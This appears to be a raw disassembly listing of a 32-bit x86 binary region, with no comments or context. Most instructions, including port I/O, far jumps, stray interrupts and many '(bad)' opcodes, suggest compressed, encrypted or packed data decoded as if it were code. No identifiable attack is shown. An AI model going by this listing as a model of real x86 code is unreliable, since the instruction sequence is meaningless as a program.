  416668:	rol    WORD PTR [esi-0xf],1
  41666c:	xchg   ecx,eax
  41666d:	test   DWORD PTR [edx-0x74],ecx
  416670:	sub    al,0x22
  416672:	int    0xeb
  416674:	fdivr  QWORD PTR [ebp+0x58]
  416677:	addr16 out dx,eax
  416679:	and    dh,ch
  41667b:	jno    0x41665d
  41667d:	rcl    DWORD PTR [ecx+0x75ce6ee8],1
  416683:	push   esi
  416684:	pop    ss
  416685:	push   eax
  416686:	xchg   edi,eax
  416687:	xchg   esp,eax
  416688:	jne    0x4166b9
  41668a:	mov    sp,0xf016
  41668e:	add    esi,ebp
  416690:	pop    esp
  416691:	push   ss
  416692:	push   ss
  416693:	inc    ecx
  416694:	pop    eax
  416695:	pop    eax
  416696:	jp     0x4166cf
  416698:	out    0xeb,al
  41669a:	das    
  41669b:	cli    
  41669c:	ds jo  0x4166cc
  41669f:	or     esp,DWORD PTR [edi+0xe29e2fc]
  4166a5:	sahf   
  4166a6:	popa   
  4166a7:	xchg   esi,eax
  4166a8:	fadd   DWORD PTR [ebp-0x4]
  4166ab:	sbb    ebp,DWORD PTR [edi+eiz*8-0x6c494f89]
  4166b2:	mov    bl,0xee
  4166b4:	push   0xffffffcd
  4166b6:	or     BYTE PTR [esp+ebx*4+0x41],al
  4166ba:	test   DWORD PTR [ecx-0x76b1982f],ecx
  4166c0:	out    0x4c,al
  4166c2:	push   ecx
  4166c3:	ret    0xb4d8
  4166c6:	inc    edi
  4166c7:	div    DWORD PTR [edi-0x2d]
  4166ca:	xor    DWORD PTR [esi],edx
  4166cc:	cmp    eax,0xe559421f
  4166d1:	push   edi
  4166d2:	xlat   BYTE PTR ds:[ebx]
  4166d3:	adc    ebp,esp
  4166d5:	imul   esi,ebx,0x72
  4166d8:	pop    es
  4166d9:	or     ebx,DWORD PTR [edi]
  4166db:	rol    esp,1
  4166dd:	arpl   WORD PTR ds:0x8f5ebd7e,si
  4166e3:	jmp    0x416713
  4166e5:	and    BYTE PTR [edi+0x1e],bl
  4166e8:	sub    DWORD PTR [esi-0x23],ecx
  4166eb:	out    0xa3,eax
  4166ed:	mov    dl,0x62
  4166ef:	cld    
  4166f0:	cmp    edx,DWORD PTR [ebp+esi*4-0x56]
  4166f4:	dec    ebp
  4166f5:	fadd   QWORD PTR ds:0xa94f84a9
  4166fb:	mov    WORD PTR [ecx+ebp*2],ss
  4166fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ff:	xchg   edx,eax
  416700:	imul   edi,edi,0x63312cc4
  416706:	mov    BYTE PTR [ebx-0xd],cl
  416709:	loop   0x416764
  41670b:	inc    eax
  41670c:	add    DWORD PTR [edx+0x2],edi
  41670f:	inc    esp
  416710:	xlat   BYTE PTR ds:[ebx]
  416711:	jnp    0x4166d5
  416713:	jle    0x4166ad
  416715:	xchg   esp,eax
  416716:	and    BYTE PTR [ebp-0x57],ah
  416719:	fisub  DWORD PTR [edx+0x1e55c531]
  41671f:	(bad)  
  416720:	xor    al,0xa5
  416722:	inc    ecx
  416723:	mov    DWORD PTR [ecx-0x6f],edi
  416726:	jmp    FWORD PTR [esi+0x1204381]
  41672c:	das    
  41672d:	nop
  41672e:	test   eax,0xa164f93d
  416733:	iret   
  416734:	ficom  WORD PTR [ebx-0x5963a4ce]
  41673a:	sti    
  41673b:	ds dec esi
  41673d:	xchg   BYTE PTR [edi],cl
  41673f:	call   DWORD PTR [edx]
  416741:	jnp    0x416713
  416743:	jp     0x4167a9
  416745:	jo     0x4166e9
  416747:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416749:	lea    ecx,[edx-0x7b]
  41674c:	mov    ds:0xddcfc319,eax
  416751:	and    DWORD PTR [ebp-0x64],ecx
  416754:	xchg   ebx,eax
  416755:	mov    al,al
  416757:	jns    0x41672a
  416759:	into   
  41675a:	leave  
  41675b:	jnp    0x41674f
  41675d:	adc    edx,DWORD PTR [ebp-0x4c]
  416760:	jo     0x41675c
  416762:	cmp    al,BYTE PTR [ecx-0x46]
  416765:	ins    BYTE PTR es:[edi],dx
  416766:	push   0x59d341b3
  41676b:	loopne 0x4167d5
  41676d:	dec    ebx
  41676e:	lods   eax,DWORD PTR es:[esi]
  416770:	in     al,0x7c
  416772:	push   ecx
  416773:	cmp    al,0x8f
  416775:	mov    BYTE PTR [esi+esi*2+0x31c4c5de],ch
  41677c:	cmp    dl,BYTE PTR [ecx]
  41677e:	mov    cl,0x1f
  416780:	dec    ebx
  416781:	dec    edx
  416782:	or     ebp,DWORD PTR [edi-0x411330ed]
  416788:	mov    ah,0x57
  41678a:	cwde   
  41678b:	xchg   esp,eax
  41678c:	mov    bh,0x4a
  41678e:	push   esi
  41678f:	inc    edx
  416790:	(bad)  
  416791:	and    eax,0x75b83fac
  416796:	pop    ebp
  416797:	pop    ecx
  416798:	mov    bh,0x21
  41679a:	pop    esi
  41679b:	fucomip st,st(0)
  41679d:	dec    eax
  41679e:	out    0xe8,eax
  4167a0:	mov    esp,0x61afd155
  4167a5:	mov    al,ds:0xcf0e49a3
  4167aa:	push   eax
  4167ab:	mov    edx,0x316714d5
  4167b0:	mov    ebx,0x5cc14d8e
  4167b5:	or     al,0xfc
  4167b8:	mov    ?,WORD PTR [ecx+0x27]
  4167bb:	retf   0xa68d
  4167be:	fisubr DWORD PTR [ebx+edi*2+0x1d30f094]
  4167c5:	pop    esp
  4167c6:	push   ecx
  4167c7:	or     ch,0x60
  4167ca:	push   ds
  4167cb:	mov    esp,0xf98f17c5
  4167d0:	(bad)  
  4167d1:	jmp    0x416762
  4167d3:	mov    ebp,0x69651a79
  4167d8:	lods   al,BYTE PTR ds:[esi]
  4167d9:	stos   DWORD PTR es:[edi],eax
  4167da:	mov    ecx,DWORD PTR [ebp+ebp*2-0x18e6ba76]
  4167e1:	mov    ah,0x84
  4167e3:	mov    ds,WORD PTR [eax+0x29869b5b]
  4167e9:	jp     0x416773
  4167eb:	or     DWORD PTR [esi+0xada474d],ebx
  4167f1:	pushf  
  4167f2:	mov    ds:0xbd8ac36,al
  4167f7:	mul    DWORD PTR [edi+0x54]
  4167fa:	mov    ecx,0xf97e0fbe
  4167ff:	rcr    DWORD PTR [edx-0x34ad5b03],0xda
  416806:	dec    edi
  416807:	mov    al,0xc6
  416809:	sbb    BYTE PTR [edx-0x3e16732d],ch
  41680f:	xchg   esp,eax
  416810:	pop    edi
  416811:	jnp    0x416888
  416813:	jg     0x4167e6
  416815:	cld    
  416816:	popa   
  416817:	imul   esi,DWORD PTR [eax+0x78],0x5ccaa2c0
  41681e:	or     BYTE PTR [ebp+0x2cc8ffa],al
  416824:	sub    al,0xf0
  416826:	into   
  416827:	sub    bh,BYTE PTR [ebx+0x19f0ca5f]
  41682d:	xor    esi,DWORD PTR [ecx+0x6d69d443]
  416833:	or     ah,BYTE PTR [ebp+0x6649d5c0]
  416839:	mov    al,0x7b
  41683b:	in     eax,0x2f
  41683d:	fcomip st,st(5)
  41683f:	push   ebx
  416840:	jecxz  0x41685a
  416842:	pop    esp
  416843:	inc    ebp
  416844:	or     DWORD PTR ss:[edx+0x2f],0x47
  416849:	cmc    
  41684a:	or     eax,DWORD PTR [si+0x21ad]
  41684f:	pop    ebx
  416850:	cmp    DWORD PTR ds:0x65600ad4,eax
  416856:	jno    0x41684f
  416858:	push   ds
  416859:	rcr    BYTE PTR [edi+ecx*8-0x484013fa],0x4e
  416861:	mov    bh,0x5e
  416863:	jb     0x41686a
  416865:	out    dx,al
  416866:	fwait
  416867:	gs inc ebx
  416869:	les    ecx,FWORD PTR [esi-0x7275c120]
  41686f:	sbb    al,BYTE PTR [edi]
  416871:	ins    DWORD PTR es:[edi],dx
  416872:	in     al,0x0
  416874:	mov    ecx,0x589f61d8
  416879:	cld    
  41687a:	nop
  41687b:	inc    ecx
  41687c:	xchg   esi,eax
  41687d:	cmp    eax,0x2a964c6d
  416882:	cmc    
  416883:	mov    al,ds:0x82ceeec4
  416888:	adc    edi,DWORD PTR [ebx-0x6f]
  41688b:	and    BYTE PTR [ebx+0x18a99e34],bh
  416891:	xchg   ebp,eax
  416892:	jl     0x41690a
  416894:	xor    al,0xa3
  416896:	jge    0x4168e6
  416898:	dec    ecx
  416899:	scas   eax,DWORD PTR es:[edi]
  41689a:	clc    
  41689b:	(bad)  
  41689c:	sti    
  41689d:	clc    
  41689e:	sbb    BYTE PTR [ebx],dh
  4168a0:	pop    edi
  4168a1:	das    
  4168a2:	mov    ds:0x6a6eaf36,eax
  4168a7:	mov    WORD PTR [ebx],gs
  4168a9:	rol    BYTE PTR [edx+0x60d39062],cl
  4168af:	(bad)  
  4168b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b1:	and    bl,BYTE PTR [edi+0x31ac0404]
  4168b7:	or     bh,BYTE PTR [ebp+0x4c37b677]
  4168bd:	imul   edi,DWORD PTR [ecx+0x7ef811e6],0x64b315f2
  4168c7:	lods   al,BYTE PTR ds:[esi]
  4168c8:	fwait
  4168c9:	adc    eax,0x49fa126e
  4168ce:	sub    ecx,DWORD PTR [esi+0x17]
  4168d1:	push   ebp
  4168d2:	loope  0x4168fa
  4168d4:	mov    esp,0x60b86b89
  4168d9:	outs   dx,DWORD PTR ds:[esi]
  4168da:	icebp  
  4168db:	push   es
  4168dc:	or     eax,0xa116281f
  4168e1:	dec    ebp
  4168e2:	sbb    eax,0xc57efe0
  4168e7:	xchg   ebx,eax
  4168e8:	sbb    BYTE PTR [edi],bh
  4168ea:	inc    esp
  4168eb:	dec    ebx
  4168ec:	xor    BYTE PTR [ecx-0x3e],dl
  4168ef:	(bad)
  4168f4:	aad    0x33
  4168f6:	xor    bl,bl
  4168f8:	leave  
  4168f9:	add    al,0x2e
  4168fb:	cmp    eax,0x271a4ea0
  416900:	fwait
  416901:	add    eax,0xf01ba4ba
  416906:	or     al,0xb
  416908:	data16 cmp al,0x93
  41690b:	and    esi,DWORD PTR [esi+ebx*1+0x7583847c]
  416912:	das    
  416913:	mov    dh,0xaf
  416915:	lea    esp,[eax+0x3510b9c2]
  41691b:	test   al,0x2e
  41691d:	mov    bl,0x63
  41691f:	mov    edx,0x1bd355ef
  416924:	inc    ebx
  416925:	inc    ebx
  416926:	daa    
  416927:	mov    ecx,0x60ed6f57
  41692c:	adc    DWORD PTR [esi+0x2b],esp
  41692f:	or     ch,cl
  416931:	mov    ds:0x62b08840,eax
  416936:	fprem  
  416938:	or     eax,edi
  41693a:	or     eax,0x680df1eb
  41693f:	mov    al,0x93
  416941:	(bad)  
  416942:	shl    BYTE PTR [ecx-0x14],1
  416945:	call   0xe2977f6d
  41694a:	jle    0x41697e
  41694c:	or     bl,BYTE PTR [ebx-0x14]
  41694f:	mov    esp,0x37b52ba3
  416954:	and    dl,BYTE PTR [ebx]
  416956:	lea    eax,[edi+0x7]
  416959:	and    ch,BYTE PTR [edx-0xc]
  41695c:	mov    dl,0xfd
  41695e:	and    al,0xfc
  416960:	push   ebp
  416961:	cld    
  416962:	jns    0x416959
  416964:	fdiv   st(0),st
  416966:	ds cmp edi,ebx
  416969:	cmp    esp,ebp
  41696b:	jmp    0x820d:0xa93b6276
  416972:	jmp    0xcef2a16d
  416977:	pop    ss
  416978:	(bad)  
  416979:	xor    ebx,DWORD PTR [edx*4-0x45cb8993]
  416980:	movhlps xmm3,xmm2
  416983:	rcl    dh,1
  416985:	jns    0x4169df
  416987:	cdq    
  416988:	mov    dl,0x86
  41698a:	in     eax,dx
  41698b:	adc    BYTE PTR [edi+edi*1-0x73],bh
  41698f:	sar    DWORD PTR ds:0xc700dd5c,0x17
  416996:	jg     0x416a08
  416998:	lods   eax,DWORD PTR ds:[esi]
  416999:	push   DWORD PTR [esi-0x6536a0e6]
  41699f:	clc    
  4169a0:	xchg   DWORD PTR [edx+0x7b2abf9c],esp
  4169a6:	ins    BYTE PTR es:[edi],dx
  4169a7:	pop    esi
  4169a8:	idiv   DWORD PTR [esi+0x60094034]
  4169ae:	jmp    0x2825eca1
  4169b3:	adc    eax,esi
  4169b5:	push   ebp
  4169b6:	or     eax,0xcac71db8
  4169bb:	adc    dh,BYTE PTR [edi]
  4169bd:	jecxz  0x41693f
  4169bf:	inc    esi
  4169c0:	push   0x2c
  4169c2:	inc    esp
  4169c3:	push   ds
  4169c4:	shl    BYTE PTR [esi-0x344f0582],cl
  4169ca:	in     al,0x9f
  4169cc:	out    dx,eax
  4169cd:	adc    al,0x88
  4169cf:	mov    ecx,0xba425300
  4169d4:	inc    eax
  4169d5:	aaa    
  4169d6:	jl     0x4169bf
  4169d8:	pop    eax
  4169d9:	xor    BYTE PTR [ecx-0x51ce942e],ah
  4169df:	test   cl,al
  4169e1:	jmp    0xc645:0xd32d012e
  4169e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e9:	add    al,0xce
  4169eb:	adc    DWORD PTR [ebx+eiz*4-0x2785562],ecx
  4169f2:	sbb    dl,BYTE PTR [ebp+0x61]
  4169f5:	arpl   WORD PTR [esi],sp
  4169f7:	clc    
  4169f8:	inc    esi
  4169f9:	bound  edi,QWORD PTR [esi+0x34]
  4169fc:	dec    ebp
  4169fd:	(bad)  
  4169ff:	add    cl,BYTE PTR [ebx]
  416a01:	lods   eax,DWORD PTR ds:[esi]
  416a02:	xchg   edx,eax
  416a03:	jns    0x416a60
  416a05:	cld    
  416a06:	mov    edi,0x945e1e0
  416a0b:	loope  0x4169f4
  416a0d:	push   edi
  416a0e:	dec    esp
  416a0f:	pop    ds
  416a10:	lods   eax,DWORD PTR ds:[esi]
  416a11:	int3   
  416a12:	xchg   ebx,eax
  416a13:	das    
  416a14:	sar    dh,0xc5
  416a17:	int    0x53
  416a19:	lock jnp 0x416a52
  416a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a1d:	(bad)  
  416a1e:	push   edx
  416a1f:	ss push ecx
  416a21:	xor    eax,0xdbe4b58a
  416a26:	out    dx,al
  416a27:	pop    ss
  416a28:	cmp    DWORD PTR [edx+0x52],eax
  416a2b:	in     eax,dx
  416a2c:	push   es
  416a2d:	lds    edi,FWORD PTR [ecx-0x3c935880]
  416a33:	add    BYTE PTR [edi-0x50],cl
  416a36:	and    ch,bh
  416a38:	sub    ebx,DWORD PTR [eax+eax*4-0x5]
  416a3c:	outs   dx,DWORD PTR ds:[esi]
  416a3e:	es xor al,0x9d
  416a41:	xchg   DWORD PTR [edi-0x53],eax
  416a44:	ror    DWORD PTR [esi],0xbd
  416a47:	popa   
  416a48:	sbb    cl,0x6d
  416a4b:	sar    DWORD PTR [edx],cl
  416a4d:	sub    eax,0x341ed3cd
  416a52:	punpckldq mm7,DWORD PTR [edx+0x3b]
  416a56:	neg    DWORD PTR [eax+edi*8+0x7c1334f7]
  416a5d:	and    esi,esi
  416a5f:	aad    0x2f
  416a61:	(bad)  
  416a62:	fidivr WORD PTR [edi]
  416a64:	inc    esi
  416a65:	adc    bh,al
  416a67:	cmp    al,0x8d
  416a69:	xchg   esp,eax
  416a6a:	mov    al,0x14
  416a6c:	jl     0x416a55
  416a6e:	push   ecx
  416a6f:	sub    ch,bl
  416a71:	inc    ecx
  416a72:	ficom  WORD PTR [ecx+0x53462450]
  416a78:	xchg   BYTE PTR [eax-0x76],bl
  416a7b:	jge    0x416a20
  416a7d:	fst    QWORD PTR [esi-0x48]
  416a80:	inc    esi
  416a81:	les    eax,FWORD PTR [edx]
  416a83:	jp     0x416a25
  416a85:	fs je  0x416af6
  416a88:	ror    BYTE PTR [ebx+ebp*8],cl
  416a8b:	push   edi
  416a8c:	add    ch,BYTE PTR [edx+eiz*4-0x75d9b23a]
  416a93:	lock xor bh,bl
  416a96:	lods   eax,DWORD PTR ds:[esi]
  416a97:	jge    0x416a75
  416a99:	push   ebp
  416a9a:	mov    DWORD PTR [edx],ebp
  416a9c:	jnp    0x416a2d
  416a9e:	xchg   ebp,eax
  416a9f:	add    DWORD PTR [eax-0x37],ebx
  416aa2:	push   esi
  416aa3:	ds jmp 0xed6f8f00
  416aa9:	arpl   WORD PTR [esi],bx
  416aab:	mov    ch,0x5b
  416aad:	cmp    eax,DWORD PTR [edx]
  416aaf:	mov    esp,0x37703077
  416ab4:	inc    ebx
  416ab5:	sub    cl,dh
  416ab7:	bound  ebp,QWORD PTR [ebp+0x7f0efa9]
  416abd:	mov    eax,ds:0xc0458d4a
  416ac2:	sbb    bl,BYTE PTR [ebx+0xd258fe2]
  416ac8:	call   0xf37ddbd2
  416acd:	cmp    eax,0x9ba943e1
  416ad2:	jl     0x416b27
  416ad4:	pop    es
  416ad5:	aad    0xa3
  416ad7:	sub    ecx,0xffffff8d
  416ada:	sbb    ch,bl
  416adc:	inc    dl
  416ade:	int3   
  416adf:	pop    DWORD PTR [esi+0x31]
  416ae2:	jbe    0x416b4e
  416ae4:	call   0x3ba8:0x5376ae4b
  416aeb:	in     al,dx
  416aec:	dec    ebx
  416aed:	in     eax,dx
  416aee:	and    DWORD PTR [esi-0x3352b8bf],0xffffffd8
  416af5:	mov    dl,0x9e
  416af7:	inc    eax
  416af8:	inc    ecx
  416af9:	pop    ecx
  416afa:	aam    0x54
  416afc:	sahf   
  416afd:	in     al,0x39
  416aff:	dec    eax
  416b00:	ficomp DWORD PTR [edi+0x56c54c3d]
  416b06:	in     eax,0x2e
  416b08:	mov    BYTE PTR [esi+0x18],bh
  416b0b:	jmp    0x7f0:0xb1f3ce75
  416b12:	shl    DWORD PTR [edx+0x5f103d4b],cl
  416b18:	mov    WORD PTR [eax+0x1d],gs
  416b1b:	dec    edi
  416b1c:	mov    al,0x92
  416b1e:	adc    BYTE PTR ds:0x10a7b0a3,al
  416b24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b25:	cwde   
  416b26:	or     cl,BYTE PTR [eax+0x6b]
  416b29:	inc    ebp
  416b2a:	int3   
  416b2b:	inc    ebp
  416b2c:	dec    eax
  416b2d:	jl     0x416ae6
  416b2f:	test   al,0x36
  416b31:	mov    bh,bl
  416b33:	inc    edx
  416b34:	and    dh,BYTE PTR [ebp+0x69]
  416b37:	loop   0x416b61
  416b39:	sbb    esp,ebx
  416b3b:	loope  0x416b7f
  416b3d:	inc    edx
  416b3e:	xor    bl,BYTE PTR [edx-0x20]
  416b41:	inc    edi
  416b42:	stos   DWORD PTR es:[edi],eax
  416b43:	inc    ecx
  416b44:	pushf  
  416b45:	mov    dl,0x36
  416b47:	(bad)  
  416b48:	mov    dl,BYTE PTR ss:[ecx+eax*8+0x7e]
  416b4d:	es adc bl,ah
  416b50:	inc    eax
  416b51:	xor    BYTE PTR [edx+0x67],0x41
  416b55:	jmp    0x1534324d
  416b5a:	push   ss
  416b5b:	jnp    0x416b9e
  416b5d:	pop    edx
  416b5e:	pop    edx
  416b5f:	test   eax,0xc1d28247
  416b64:	mov    ah,0x40
  416b66:	addr16 je 0x416b48
  416b69:	add    BYTE PTR ds:0xcf26a4b8,al
  416b6f:	cwde   
  416b70:	sub    al,0x66
  416b72:	fnstcw WORD PTR [ebx-0x2b]
  416b75:	test   eax,0x7fa62067
  416b7a:	inc    esp
  416b7b:	sbb    DWORD PTR [ebx],0xa36ec51c
  416b81:	std    
  416b82:	dec    ebx
  416b83:	out    dx,al
  416b84:	icebp  
  416b85:	pusha  
  416b86:	js     0x416b9f
  416b88:	mov    ebp,0xd13c5eea
  416b8d:	and    eax,0x1f4a1950
  416b92:	das    
  416b93:	xor    ebx,esi
  416b95:	mov    bh,0xe5
  416b97:	mov    edx,0xce7d94c6
  416b9c:	sub    ecx,DWORD PTR [ebx-0x536f8d9e]
  416ba2:	jmp    0x416bfe
  416ba4:	mov    dl,0xe0
  416ba6:	sub    BYTE PTR ds:0xe1b15de3,0x29
  416bad:	add    DWORD PTR ds:0x337e49c4,edx
  416bb3:	mov    ebx,0xe837c99b
  416bb8:	pop    edi
  416bb9:	and    ebp,esi
  416bbb:	mov    ebx,0x2c9a928f
  416bc0:	ds call 0xde57d73b
  416bc6:	mov    cl,0xf
  416bc8:	ins    BYTE PTR es:[edi],dx
  416bc9:	xor    eax,esp
  416bcb:	ins    DWORD PTR es:[edi],dx
  416bcc:	je     0x416c2b
  416bce:	test   eax,0xdb3e9d27
  416bd3:	and    al,0x4f
  416bd5:	into   
  416bd6:	mov    edi,0xe82a5cb3
  416bdb:	dec    edi
  416bdc:	inc    ebp
  416bdd:	add    eax,0x46580b28
  416be2:	push   ebx
  416be3:	xchg   edx,eax
  416be4:	push   edi
  416be5:	cs pop ss
  416be7:	retf   
  416be8:	xchg   bh,al
  416bea:	jb     0x416b97
  416bec:	pop    edi
  416bed:	push   ecx
  416bee:	lock cmp BYTE PTR [esi],bl
  416bf1:	data16 cmp BYTE PTR [edx+0x45],bh
  416bf5:	lock arpl WORD PTR ds:0x99cc88ae,ax
  416bfc:	cmp    DWORD PTR [ecx],ebx
  416bfe:	mov    ah,BYTE PTR ss:[eax+ebp*4+0x42]
  416c03:	ret    
  416c04:	cmp    BYTE PTR [ecx],0x9e
  416c07:	outs   dx,DWORD PTR ds:[esi]
  416c08:	dec    edx
  416c09:	(bad)  
  416c0a:	scas   al,BYTE PTR es:[edi]
  416c0b:	imul   esp,DWORD PTR [ebx],0xffffffc2
  416c0e:	jne    0x416c8b
  416c10:	xchg   esp,eax
  416c11:	and    eax,0x33f8b372
  416c16:	fbstp  TBYTE PTR [eax-0x455093c2]
  416c1c:	and    al,0xba
  416c1e:	or     dl,dl
  416c20:	mov    dl,0x31
  416c22:	inc    edx
  416c23:	nop
  416c24:	sbb    esi,DWORD PTR [ebp-0x54]
  416c27:	cli    
  416c28:	sbb    eax,0x276e9456
  416c2d:	and    cl,BYTE PTR [ecx-0x75]
  416c30:	mov    DWORD PTR [ecx-0x6faab8b6],ecx
  416c36:	cli    
  416c37:	sub    eax,0x7fec009
  416c3c:	lds    ecx,FWORD PTR [esi+0x35]
  416c3f:	push   0xffffffba
  416c41:	add    bl,ch
  416c43:	mov    ss,WORD PTR [ecx+0x42]
  416c46:	rcl    bh,1
  416c48:	les    eax,FWORD PTR [eax-0x13]
  416c4b:	lock push ebx
  416c4d:	pop    edx
  416c4e:	or     dl,al
  416c50:	add    al,0xf4
  416c52:	sahf   
  416c53:	cmp    dh,bl
  416c55:	inc    ebx
  416c56:	and    dl,cl
  416c58:	mov    ah,0x73
  416c5a:	jae    0x416ca4
  416c5c:	xchg   esp,eax
  416c5d:	jge    0x416c94
  416c5f:	out    dx,al
  416c60:	aad    0x9d
  416c62:	popf   
  416c63:	es sti 
  416c65:	fstp   st(1)
  416c67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c68:	test   eax,0x3f494ea9
  416c6d:	jo     0x416cd5
  416c6f:	xchg   DWORD PTR [ecx],eax
  416c71:	xchg   ebx,eax
  416c72:	inc    edx
  416c73:	jecxz  0x416c19
  416c75:	mov    al,ds:0x3bc4980a
  416c7a:	mov    ebp,0x69a92b38
  416c7f:	fstp   DWORD PTR [edi-0x47]
  416c82:	pop    ecx
  416c83:	lahf   
  416c84:	aad    0x96
  416c86:	in     al,0x2
  416c88:	add    al,0x50
  416c8a:	dec    eax
  416c8b:	cmp    ch,BYTE PTR [ebx-0x15]
  416c8e:	pop    ebp
  416c8f:	call   0xc4ca:0x7cccf70e
  416c96:	scas   eax,DWORD PTR es:[edi]
  416c97:	pop    ecx
  416c98:	mov    eax,ds:0xb4f4c020
  416c9d:	int3   
  416c9e:	shl    DWORD PTR ds:0xe21e7f76,cl
  416ca4:	inc    ebp
  416ca5:	int    0x4c
  416ca7:	ficom  DWORD PTR [edi-0x1a]
  416caa:	out    0xc,al
  416cac:	pop    edx
  416cad:	pop    esp
  416cae:	jecxz  0x416c93
  416cb0:	ins    DWORD PTR es:[edi],dx
  416cb1:	das    
  416cb2:	or     BYTE PTR [esi],dh
  416cb4:	arpl   WORD PTR [ebx+0x5c],si
  416cb7:	fwait
  416cb8:	lods   eax,DWORD PTR ds:[esi]
  416cb9:	pushf  
  416cba:	or     eax,0xc34c5ee1
  416cbf:	rcl    BYTE PTR [edx],0xcc
  416cc2:	bound  ecx,QWORD PTR ds:0x802a377
  416cc8:	pop    ebp
  416cc9:	cld    
  416cca:	adc    al,0xc8
  416ccc:	div    BYTE PTR [edx+0x6d]
  416ccf:	xchg   ebx,eax
  416cd0:	fld    DWORD PTR [ecx+0x6d]
  416cd3:	ins    DWORD PTR es:[edi],dx
  416cd4:	jge    0x416c7c
  416cd6:	push   ecx
  416cd7:	inc    edx
  416cd8:	lds    eax,FWORD PTR [eax]
  416cda:	jae    0x416d01
  416cdc:	mov    ss,WORD PTR [ebp-0x4817f5c]
  416ce2:	loopne 0x416d34
  416ce4:	lea    ebx,ds:0x1010de17
  416cea:	add    edx,DWORD PTR [ebx+0x1db5bcc7]
  416cf0:	mov    cl,0x7c
  416cf2:	xlat   BYTE PTR ds:[ebx]
  416cf3:	(bad)  
  416cf4:	jns    0x416d25
  416cf6:	xchg   esi,eax
  416cf7:	jns    0x416cea
  416cf9:	shr    DWORD PTR [esi-0x26d5bae9],0x5e
  416d00:	and    eax,0xd5fd4f07
  416d05:	scas   al,BYTE PTR es:[edi]
  416d06:	repnz and DWORD PTR [eax+0x707259fd],ebp
  416d0d:	aad    0x87
  416d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d10:	pop    ds
  416d11:	(bad)  
  416d12:	mov    edi,0x72947924
  416d17:	in     al,0xbb
  416d19:	(bad)  
  416d1a:	sbb    DWORD PTR [edi-0x3b640dc7],esi
  416d20:	mov    ds:0xce20b472,eax
  416d25:	and    BYTE PTR [ecx-0x12],al
  416d28:	sbb    eax,edx
  416d2a:	xor    eax,0x489be23
  416d2f:	xchg   BYTE PTR es:[ebx],dh
  416d32:	outs   dx,DWORD PTR ds:[esi]
  416d33:	add    cl,BYTE PTR [ebp-0x104efbd3]
  416d39:	inc    edi
  416d3a:	add    ch,BYTE PTR [edi]
  416d3c:	and    eax,0x1d7c453f
  416d41:	addr16 pop ds
  416d43:	mov    bl,bh
  416d45:	sbb    DWORD PTR [esi],ecx
  416d47:	fcmovne st,st(1)
  416d49:	sub    DWORD PTR [esi+0x7fe51f4c],0xffffffd0
  416d50:	dec    esi
  416d51:	xchg   ebx,eax
  416d52:	pop    ds
  416d53:	iret   
  416d54:	inc    DWORD PTR [esi+eiz*2+0x33]
  416d58:	mov    dh,BYTE PTR [ecx-0x368f05b0]
  416d5e:	lods   al,BYTE PTR ds:[esi]
  416d5f:	inc    ebx
  416d60:	mov    ds:0x9e5c76a1,eax
  416d65:	inc    esi
  416d66:	mov    edi,0xdc79e54e
  416d6b:	out    dx,al
  416d6c:	shl    DWORD PTR [ebx+0x637d1604],1
  416d72:	call   0x683b:0x1308d5ce
  416d79:	(bad)  
  416d7a:	mov    dl,0xe6
  416d7c:	sbb    bl,BYTE PTR [ebx+0x44aaf813]
  416d82:	jp     0x416df9
  416d84:	xor    eax,0xb95ead7b
  416d89:	jmp    0xd2171880
  416d8e:	jle    0x416d63
  416d90:	dec    ebx
  416d91:	or     BYTE PTR [eax],ah
  416d93:	or     DWORD PTR [ecx],edi
  416d95:	pushf  
  416d96:	das    
  416d97:	inc    ecx
  416d98:	adc    ebp,ecx
  416d9a:	inc    esi
  416d9b:	xchg   ebx,eax
  416d9c:	sub    BYTE PTR [ecx+0x3c],ah
  416d9f:	ja     0x416dbf
  416da1:	pop    ebx
  416da2:	aad    0x3d
  416da4:	inc    eax
  416da5:	rol    DWORD PTR [esi-0x25],1
  416da8:	jge    0x416ddc
  416daa:	enter  0xc9d1,0x44
  416dae:	in     al,0xcc
  416db0:	xlat   BYTE PTR ds:[ebx]
  416db1:	stos   DWORD PTR es:[edi],eax
  416db2:	cmp    al,0x6a
  416db4:	(bad)  
  416db5:	repnz fild DWORD PTR [edx]
  416db8:	ja     0x416de7
  416dba:	cmp    ecx,ecx
  416dbc:	sub    bh,BYTE PTR [esi+0x607eae63]
  416dc2:	mov    ds:0x910ff393,al
  416dc7:	fimul  WORD PTR [ecx]
  416dc9:	mov    ah,0x5
  416dcb:	push   0xffffff9d
  416dcd:	pop    esp
  416dce:	dec    esp
  416dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dd0:	(bad)  
  416dd1:	leave  
  416dd2:	cwde   
  416dd3:	push   ebp
  416dd4:	xor    dh,BYTE PTR [ebx]
  416dd6:	push   cs
  416dd7:	int3   
  416dd8:	dec    esp
  416dd9:	sahf   
  416dda:	fidivr WORD PTR [ebx+0x35]
  416ddd:	ror    BYTE PTR [edi+ecx*2-0x778c82e6],0x48
  416de5:	jo     0x416e4b
  416de7:	stos   DWORD PTR es:[edi],eax
  416de8:	sub    dh,BYTE PTR [edi-0x7bd36164]
  416dee:	mov    ah,al
  416df0:	adc    BYTE PTR [edx+0x839a689],bh
  416df6:	mov    WORD PTR [ecx+0x721aee2b],gs
  416dfc:	cmp    DWORD PTR [ebx+0x7db80724],ecx
  416e02:	mov    eax,ds:0x7ceb555f
  416e07:	jb     0x416e21
  416e09:	enter  0x45df,0x58
  416e0d:	icebp  
  416e0e:	cmp    BYTE PTR [ecx],0x8e
  416e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e12:	div    BYTE PTR [edi]
  416e14:	xchg   edi,eax
  416e15:	lea    ecx,[ebp-0x1c]
  416e18:	arpl   WORD PTR fs:[eax+0x1e],di
  416e1c:	fidivr WORD PTR [eax+0x2b4b4d36]
  416e22:	dec    ebp
  416e23:	pop    esp
  416e24:	push   eax
  416e25:	xor    al,0x2d
  416e27:	inc    eax
  416e28:	mov    dl,BYTE PTR [edx-0x6d]
  416e2b:	push   ebp
  416e2c:	in     eax,dx
